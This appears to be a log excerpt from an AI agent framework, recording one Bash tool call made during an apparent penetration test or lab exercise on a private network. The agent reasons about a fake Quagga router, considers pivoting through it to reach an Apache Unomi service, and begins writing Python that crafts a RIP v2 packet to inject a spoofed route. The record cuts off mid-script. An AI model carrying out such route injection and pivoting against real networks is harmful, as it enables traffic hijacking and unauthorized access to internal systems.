2026-09-18 03:00:06,471 [INFO] excalibur.core.langfuse: [TOOL]: Bash: {'command': '# This is clearly not Quagga itself - it\'s a honeypot or a custom service that \n# mimics a Quagga banner but drops connections.\n#\n# Let me reconsider the entire setup:\n# 1. .1 has ports 2601 and 2602 open - but the service just sends a banner and drops\n# 2. .10 has all ports closed  \n#\n# What if .10 is not a separate host but the SAME host as .1 with a different IP?\n# What if the Quagga router IS at .10 behind a firewall that only allows specific traffic?\n#\n# Let me check - maybe .10 responds on port 8181 from specific source IPs or conditions.\n# What if I need to access Unomi from WITHIN 10.254.200.0/24?\n#\n# Actually, let\'s check if there\'s a way to use the Quagga router as a proxy.\n# In some routers, you can telnet FROM the router to other hosts.\n# If I can get the Quagga VTY working, I could do "telnet 192.168.x.x 8181"\n#\n# But the VTY is broken/dead. So let\'s focus on RIP.\n# Previous work showed RIP response with default route metric 16.\n# What if I can send a RIP update with a new route? Even without raw sockets,\n# maybe I can do UDP via python.\n\npython3 << \'PYEOF\'\nimport socket\n\n# Try sending a RIP v2 update via UDP socket\n# RIP v2 uses multicast 224.0.0.9 or UDP broadcast\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nsock.settimeout(3)\nsock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)\n\n# Construct a simple RIP v2 ROUTE INJECTION\n# RIP v2 response format: command=2, version=2\n# Then 20-byte route entries\n\n# Try sending a RIP response to the router claiming route 192.168.100.0/24 metric 1\nrip_response = bytearray()\nrip_response.append(0x02)  # Command: Response\nrip_response.append(0x02)  # Version: 2\nrip_response.extend(b\'\\x00\\x00\')  # Must be zero (routing domain)\n# Route entry: AFI=2 (IP), Route Tag=0, IP=192.168.100.0, Mask=255.255.255.0, Next Hop=0.0.0.0, Metric=1\nrip_response.extend(b\'\\x00\\x02\')  # A